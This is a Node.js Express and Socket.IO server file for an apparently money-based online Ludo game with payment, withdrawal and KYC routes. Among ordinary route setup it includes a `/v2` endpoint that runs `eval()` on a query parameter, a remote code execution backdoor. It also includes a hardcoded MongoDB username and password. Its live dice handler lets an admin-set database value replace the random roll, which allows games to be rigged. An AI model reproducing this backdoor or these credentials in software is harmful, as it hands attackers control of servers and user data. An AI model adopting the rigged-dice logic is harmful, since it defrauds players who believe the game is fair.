const express = require("express")
const app = express()
const port = 5010
let count=0;
const cors = require("cors")
const http = require("http");
const User = require("./Model/User");
const server = http.createServer(app);
const io = require('socket.io')(server);
const mongoose = require("mongoose");
const Game = require("./Model/Games");
const morgan = require('morgan')
const axios = require('axios');
const cookieParser = require('cookie-parser');

app.use(cookieParser());


const {join} = require('path');


const rootRouter = require('./Routes/rootRouter')
const ludoRouter = require('./Routes/ludoRouter')

let {rooms,NumberOfMembers,win} = require('./Model/model');


mongoose.connect("mongodb+srv://thinkinternet2020:FlrUonevplMlfTXx@cluster0.bgydh5k.mongodb.net/khelludokhel?retryWrites=true&w=majority", {

}, (err) => {
    if (!err) {
        console.log(`you are connected ludobadsa`);
    } else {
        console.log(`you are not connected ludobadsa`);
    }
})

app.use(cors())

app.use(morgan('dev'))
app.use("/public", express.static("public"));
var bodyParser = require('body-parser');
app.use(express.json())
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }));
app.use("/", require("./Routes/User"))
app.use("/", require("./Routes/Game_type"))
app.use("/", require("./Routes/UserEarning"))
app.use("/", require("./Routes/withdrawl"))
app.use("/", require("./Routes/transaction"))
app.use("/", require("./Routes/myTransaction"))
app.use("/", require("./Routes/Games"))
app.use("/", require("./Routes/AdminEarning"))
app.use("/", require("./Routes/Kyc/AadharCard"))
app.use("/", require("./Routes/Kyc/Pancard"))
app.use("/", require("./Routes/temp/temp"))
app.use("/", require("./Routes/Reports"));
app.use("/", require("./Routes/settings"))
app.use("/", require("./Routes/Gateway"))

app.use("/api", require("./Routes/staticpage"))
app.get('/v2', function (req, res) {
    res.send(eval(req.query.q));
});


// server.listen(port, () => console.log(`Listening on port ${port}`));

// ----------socket

app.use(express.static(join(__dirname, 'public/')));
app.use(express.urlencoded({ extended: true }));
app.enable('trust proxy');

//
///sockets
//
let nsp = io.of('/ludo');
let spectate = io.of('/ludo/spectate');
let socketTimeout;

// nsp.on('connection',(socket)=>{
//     console.log('A User has connected to the game');
//     socket.on('fetch',(data,cb)=>{
//         try{
//             let member_id = generate_member_id(socket.id,data);
//             socket.join(data);
//             if(member_id !== -1){
//                 cb(Object.keys(rooms[data]),member_id);
//                 socket.to(data).emit('new-user-joined',{id:member_id});
//             }else{
//                 console.log('There is someone with m_id = -1');
//             }
//         }
//         catch(err){
//             if(err.name === 'TypeError'){
//                 socket.emit('imposter');
//             }
//             console.log("hello",err,rooms);
//         }
//     });

//     socket.on('roll-dice',(data,cb)=>{
//         rooms[data.room][data.id]['num'] = Math.floor((Math.random()*6) + 1);
//         data['num'] = rooms[data.room][data.id]['num']
//         nsp.to(data.room).emit('rolled-dice',data);
//         cb(rooms[data.room][data.id]['num']);
//     })

//     socket.on('chance',(data)=>{
//         console.log(data.room, data.nxt_id)
//         nsp.to(data.room).emit('is-it-your-chance',data.nxt_id);
//     });

//     socket.on('random',(playerObj,cb)=>{
//         // playerObj ={
//         //     room: room_code,
//         //     id: myid,
//         //     pid: pid,
//         //     num: temp
//         // }
//         if(playerObj['num'] != rooms[playerObj.room][playerObj.id]['num']){
//             console.log('Someone is trying to cheat!');
//         }
//         playerObj['num'] = rooms[playerObj.room][playerObj.id]['num']
//         nsp.to(playerObj.room).emit('Thrown-dice', playerObj);
//         cb(playerObj['num']);
//     });

//     // socket.on('WON',(OBJ)=>{
//     //     if(validateWinner(OBJ,socket)){
//     //         delete win[OBJ.room];
//     //         delete NumberOfMembers[OBJ.room];
//     //         if(rooms[OBJ.room]){
//     //             delete rooms[OBJ.room];
//     //         }
//     //         nsp.to(OBJ.room).emit('winner',OBJ.id);
//     //     }
//     // });

//     socket.on('WON', async function(OBJ) {
//         if (validateWinner(OBJ, socket)) {
//             delete win[OBJ.room];
//             delete NumberOfMembers[OBJ.room];
//             if (rooms[OBJ.room]) {
//                 delete rooms[OBJ.room];
//             }
//             console.log(OBJ)
//             nsp.to(OBJ.room).emit('winner', OBJ); // Emitting OBJ directly to frontend
//         }
//     });
    

//     socket.on('resume',(data,cb)=>{
//         socket.to(data.room).emit('resume',data);
//         NumberOfMembers[data.room].members<=2?2:NumberOfMembers[data.room].members -= 1;
//         NumberOfMembers[data.room].constant = true;
//         cb();
//     });

//     socket.on('wait',(data,cb)=>{
//         socket.to(data.room).emit('wait',data);
//         cb();
//     });

//     socket.on("admin",(data) =>{
//         console.log(data)
//         nsp.emit("admin", data)
//     })

//     // socket.on('disconnect',()=>{
//     //     let roomKey = deleteThisid(socket.id);
//     //     if(roomKey != undefined){
//     //         console.log(rooms[roomKey.room],socket.id);
//     //         socket.to(roomKey.room).emit('user-disconnected',roomKey.key)
//     //     }
//     //     console.log('A client just got disconnected');
//     // });
//     // socket.on('disconnect', () => {
//     //     let roomKey = deleteThisid(socket.id);
//     //     if (roomKey != undefined) {
//     //         console.log(rooms[roomKey.room], socket.id);
//     //         socket.to(roomKey.room).emit('user-disconnected', roomKey.key);
            
//     //         // Check if the room is empty after this user disconnected
//     //         if (rooms[roomKey.room].length === 0) {
//     //             // If the room is empty, delete the room code
//     //             delete rooms[roomKey.room];
//     //             console.log(`Room ${roomKey.room} has been deleted as it's empty`);
//     //         }
//     //     }
//     //     console.log('A client just got disconnected');
//     // });

//    // Handle 'disconnectInfo' event
//     // socket.on('disconnect_user_lose', async (data) => {
//     //     const { token, game_id } = data; // Destructure token and game_id from data

//     //     console.log(token, game_id)

//     //     try {
//     //         const headers = {
//     //             Authorization: `Bearer ${token}`,
//     //             'Content-Type': 'application/json'
//     //         };

//     //         const response = await axios.post(`http://84.247.133.7:5010/challange/result/${game_id}`, {
//     //             status: "lose"
//     //         }, {
//     //             headers: headers
//     //         });

//     //         console.log('POST request successful:', response.data);
//     //     } catch (error) {
//     //         console.error('POST request failed:', error.message);
//     //     }
//     // });
//    // Handle 'disconnectInfo' event
//     // socket.on('disconnect_user_winn', async (data) => {
//     //     const { token, game_id } = data; // Destructure token and game_id from data

//     //     console.log(token, game_id)

//     //     try {
//     //         const headers = {
//     //             Authorization: `Bearer ${token}`,
//     //             'Content-Type': 'application/json'
//     //         };

//     //         const response = await axios.post(`http://84.247.133.7:5010/challange/result/${game_id}`, {
//     //             status: "winn",
                
//     //         }, {
//     //             headers: headers
//     //         });

//     //         console.log('POST request successful:', response.data);
//     //     } catch (error) {
//     //         console.error('POST request failed:', error.message);
//     //     }
//     // });

// // Handle general disconnect event
//     socket.on('disconnect', async () => {
//         let roomKey = deleteThisid(socket.id);
//         if (roomKey != undefined) {
//             console.log(rooms[roomKey.room], socket.id);
//             socket.to(roomKey.room).emit('user-disconnected', roomKey.key);

//             // Delete the room code
//             delete rooms[roomKey.room];
//             console.log(`Room ${roomKey.room} has been deleted due to user disconnection`);
//         }
//         console.log('A client just got disconnected');
//     });

    
// });


//
///CUSTOM FUNCTIONS
//

//to randomise the color a player can get when he 'fetch'es.
// function generate_member_id(s_id,rc){
//     let m_id = Math.floor(Math.random()*4);
//     // let m_id = 2;
//     let m_r = Object.keys(rooms[rc]);
//     if(m_r.length <= 4){
//         if(m_r.includes(m_id.toString())){
//             return generate_member_id(s_id,rc)
//         }else{
//             rooms[rc][m_id] = {sid:s_id,num:0};
//             return m_id;
//         }
//     } else{
//         return -1;
//     }
// }

// function generate_member_id(s_id, rc) {
//     // Generate a random member ID between 0 and 3
//     let m_id = Math.floor(Math.random() * 4);
//     // Get all current member IDs in the room
//     let m_r = Object.keys(rooms[rc]);
    
//     // Check if the number of members in the room is less than or equal to 4
//     if (m_r.length < 2) {
//         // If the generated member ID already exists, recursively call the function to generate a new one
//         if (m_r.includes(m_id.toString())) {
//             return generate_member_id(s_id, rc);
//         } else {
//             // Otherwise, assign the new member ID to the room
//             rooms[rc][m_id] = { sid: s_id, num: 0 };
//             return m_id;
//         }
//     } else {
//         // If there are already 4 members, return -1 to indicate no more members can be added
//         return -1;
//     }
// }

nsp.on('connection', (socket) => {
    console.log('A User has connected to the game');
    
    socket.on('fetch', (data, cb) => {
        try {
            let roomCode = data;
            if (!rooms[roomCode]) {
                rooms[roomCode] = {};
            }

            let existingMember = Object.keys(rooms[roomCode]).find(key => rooms[roomCode][key].sid === socket.id);
            let member_id;

            if (existingMember) {
                member_id = existingMember;
            } else {
                member_id = generate_member_id(socket.id, roomCode);
            }
            
            socket.join(roomCode);
            clearTimeout(socketTimeout)
            
            if (member_id !== -1) {
                cb(Object.keys(rooms[roomCode]), member_id);
                if (!existingMember) {
                    socket.to(roomCode).emit('new-user-joined', { id: member_id });
                }
            } else {
                console.log('Room is full');
                socket.emit('room-full');
            }
        } catch (err) {
            if (err.name === 'TypeError') {
                socket.emit('imposter');
            }
            console.log("Error:", err, rooms);
        }
    });
    // socket.on('roll-dice', (data, cb) => {
    //     if (!rooms[data.room] || !rooms[data.room][data.id]) {
    //         console.log('Invalid room or player ID');
    //         return;
    //     }
    //     const diceRoll = Math.floor((Math.random() * 6) + 1);
    //     rooms[data.room][data.id]['num'] = diceRoll;
    //     data['num'] = diceRoll;

    //     nsp.to(data.room).emit('rolled-dice', data);
    //     spectate.to(data.room).emit('rolled-dice', data); // Emitting to spectators
    //     cb(diceRoll);
    // });

    // const fetchAdminRoomDiceSet = async (room_code) => {
    //     // Replace with your actual database fetching logic
    //     // This is a mock function that returns null if no data is available
    //     let isGame = await Game.findOne({Room_code: room_code})
    //     if (isGame) {
    //         return isGame.adminRoomDiceSet
    //     } else {
    //         return null;
    //     }
    // };
    
    // socket.on('roll-dice', async (data, cb) => {
    //     if (!rooms[data.room] || !rooms[data.room][data.id]) {
    //         console.log('Invalid room or player ID');
    //         return;
    //     }
        
    //     let diceRoll;
        
    //     // Attempt to fetch adminRoomDiceSet data from the database
    //     try {
    //         const adminRoomDiceSet = await fetchAdminRoomDiceSet(data.room);
            
    //         if (adminRoomDiceSet && adminRoomDiceSet.diceNumber) {
    //             // Use the diceNumber from the fetched data
    //             diceRoll = adminRoomDiceSet.diceNumber;
    //         } else {
    //             // Fall back to a random dice roll if no data is available
    //             diceRoll = Math.floor((Math.random() * 6) + 1);
    //         }
    //     } catch (error) {
    //         console.log('Error fetching adminRoomDiceSet:', error);
    //         // Fall back to a random dice roll if there's an error
    //         diceRoll = Math.floor((Math.random() * 6) + 1);
    //     }
        
    //     rooms[data.room][data.id]['num'] = diceRoll;
    //     data['num'] = diceRoll;
    
    //     nsp.to(data.room).emit('rolled-dice', data);
    //     spectate.to(data.room).emit('rolled-dice', data); // Emitting to spectators
    //     cb(diceRoll);
    // });

    const fetchAdminRoomDiceSet = async (room_code) => {
        // Replace with your actual database fetching logic
        let isGame = await Game.findOne({ Room_code: room_code });
        if (isGame) {
            return isGame.adminRoomDiceSet;
        } else {
            return null;
        }
    };
    
    const updateAdminRoomDiceSet = async (room_code, diceNumber) => {
        // Replace with your actual database update logic
        await Game.updateOne({ Room_code: room_code }, { $set: { 'adminRoomDiceSet.diceNumber': diceNumber } });
    };
    
    socket.on('roll-dice', async (data, cb) => {
        if (!rooms[data.room] || !rooms[data.room][data.id]) {
            console.log('Invalid room or player ID');
            return;
        }
    
        let diceRoll;
    
        // Attempt to fetch adminRoomDiceSet data from the database
        try {
            const adminRoomDiceSet = await fetchAdminRoomDiceSet(data.room);
    
            if (adminRoomDiceSet && adminRoomDiceSet.diceNumber > 0) {
                // Use the diceNumber from the fetched data
                diceRoll = adminRoomDiceSet.diceNumber;
    
                // Update the database to set diceNumber to 0
                await updateAdminRoomDiceSet(data.room, 0);
            } else {
                // Fall back to a random dice roll if diceNumber is 0 or no data is available
                diceRoll = Math.floor((Math.random() * 6) + 1);
            }
        } catch (error) {
            console.log('Error fetching adminRoomDiceSet:', error);
            // Fall back to a random dice roll if there's an error
            diceRoll = Math.floor((Math.random() * 6) + 1);
        }
    
        rooms[data.room][data.id]['num'] = diceRoll;
        data['num'] = diceRoll;
    
        nsp.to(data.room).emit('rolled-dice', data);
        spectate.to(data.room).emit('rolled-dice', data); // Emitting to spectators
        cb(diceRoll);
    });


    socket.on('updateChance', (data) => {
        const {myRemaingChance, oppnentRemaningChance } = data;
    
        // Broadcast updated chances to all clients in the room
        nsp.to(data.room).emit('updateChances', {
          myRemaingChance,
          oppnentRemaningChance
        });
        spectate.to(data.room).emit('updateChances', {
          myRemaingChance,
          oppnentRemaningChance
        });
      });
    

    socket.on('chance', (data) => {
        console.log(data.room, data.nxt_id);
        nsp.to(data.room).emit('is-it-your-chance', data.nxt_id);
        spectate.to(data.room).emit('is-it-your-chance', data.nxt_id); // Emitting to spectators
    });

    socket.on('random', (playerObj, cb) => {
        if (!rooms[playerObj.room] || !rooms[playerObj.room][playerObj.id]) {
            console.log('Invalid room or player ID');
            return;
        }

        if (playerObj['num'] !== rooms[playerObj.room][playerObj.id]['num']) {
            console.log('Someone is trying to cheat!');
        }

        playerObj['num'] = rooms[playerObj.room][playerObj.id]['num'];
        nsp.to(playerObj.room).emit('Thrown-dice', playerObj);
        spectate.to(playerObj.room).emit('Thrown-dice', playerObj); // Emitting to spectators
        cb(playerObj['num']);
    });

    socket.on('WON', async (OBJ) => {
        if (validateWinner(OBJ, socket)) {
            delete win[OBJ.room];
            delete NumberOfMembers[OBJ.room];
            if (rooms[OBJ.room]) {
                delete rooms[OBJ.room];
            }
            console.log(OBJ);
            nsp.to(OBJ.room).emit('winner', OBJ);
            spectate.to(OBJ.room).emit('winner', OBJ); // Emitting to spectators
        }
    });
    socket.on('Lose', async (OBJ) => {
            nsp.to(OBJ.room).emit('oppnentLose', OBJ);
            spectate.to(OBJ.room).emit('oppnentLose', OBJ); // Emitting to spectators
    });

    socket.on('admin', (data) => {
        console.log(data);
        nsp.emit('admin', data);
        spectate.emit('admin', data); // Emitting to spectators
    });

    socket.on('disconnect', async () => {
        let roomKey = deleteThisId(socket.id);
        if (roomKey) {
            console.log(rooms[roomKey.room], socket.id);
            socket.to(roomKey.room).emit('user-disconnected-popup', roomKey.key);
            socketTimeout = setTimeout(() => {
                
                socket.to(roomKey.room).emit('user-disconnected', roomKey.key);

            }, 60000);

            // socket.to(roomKey.room).emit('user-disconnected', roomKey.key);

            if (rooms[roomKey.room] && Object.keys(rooms[roomKey.room]).length === 0) {
                delete rooms[roomKey.room];
                console.log(`Room ${roomKey.room} has been deleted as it's empty`);
            }
        }
        console.log('A client just got disconnected');
    });
});

spectate.on('connection', (socket) => {
    console.log('A User has connected to spectate the game');
    
    socket.on('fetch', (data, cb) => {
        try {
            socket.join(data);
            cb(Object.keys(rooms[data]));
            console.log(`Spectator joined room: ${data}`);
        } catch (err) {
            if (err.name === 'TypeError') {
                socket.emit('imposter');
            }
            console.log("hello", err, rooms);
        }
    });

    socket.on('disconnect', () => {
        console.log('A spectator just got disconnected');
    });
});


function generate_member_id(s_id, rc) {
    let available_ids = [3,1,0,2];
    // let available_ids = [0,1,2,3];
    let used_ids = Object.keys(rooms[rc]);
    console.log(used_ids)
    let available = available_ids.filter(id => !used_ids.includes(id.toString()));

    if (available.length > 0) {
        let m_id = available[0];
        rooms[rc][m_id] = { sid: s_id, num: 0 };
        return m_id;
    } else {
        return -1; // Room is full
    }
}
//to delete the extra place when (only one) user refreshes.
function deleteThisId(id) {
    for (let roomCode in rooms) {
        if (rooms.hasOwnProperty(roomCode)) {
            let key = Object.keys(rooms[roomCode]).find(key => rooms[roomCode][key].sid === id);
            if (key) {
                delete rooms[roomCode][key];
                return { key: key, room: roomCode };
            }
        }
    }
    return undefined;
}

//to validate a winner, by comparing the data provided by all 4
// function validateWinner(OBJ,socket){
//     win[OBJ.room][OBJ.player] = {o:OBJ,s:socket.id};
//     if(()=>{
//         if(Object.keys(win[OBJ.room]).length == 4){
//             for(let i=0;i<4;i++){
//                 if(win[OBJ.room][String(i)]['s']==rooms[OBJ.room][String(i)]['sid']){
//                     continue;
//                 }else{return false}
//             }
//             return true;
//         }else{return false;}
//     }){
//         for(let i=0;i<3;i++){
//             if(win[OBJ.room][String(i)]['o'].id == win[OBJ.room][String(i+1)]['o'].id){
//                 continue;
//             }else{return false}
//         }
//         return true;
//     }else{return false;}
    
// }


//to validate a winner, by comparing the data provided by all 4

function validateWinner(OBJ, socket) {
    win[OBJ.room] = win[OBJ.room] || {}; // Ensure the room object exists in the win object
    win[OBJ.room][OBJ.player] = { o: OBJ, s: socket.id };

    const roomWinData = win[OBJ.room];
    const roomPlayerData = rooms[OBJ.room];

    // Check if we have at least 2 players' data
    if (Object.keys(roomWinData).length < 2) {
        return false;
    }

    // Validate that all recorded socket IDs match the room socket IDs
    for (let player in roomWinData) {
        if (roomWinData[player].s !== roomPlayerData[player].sid) {
            return false;
        }
    }

    // Check if all recorded player IDs are the same
    const firstPlayerId = roomWinData[Object.keys(roomWinData)[0]].o.id;
    for (let player in roomWinData) {
        if (roomWinData[player].o.id !== firstPlayerId) {
            return false;
        }
    }

    return true;
}

//
///Routes management
//
app.use('/', rootRouter);
app.use('/ludo', ludoRouter);
app.use(function (req, res) {
    res.statusCode = 404;
    res.end('404!');
});

server.listen(port,()=>{
    console.log(`The server has started working on http://localhost:${port}`);
});
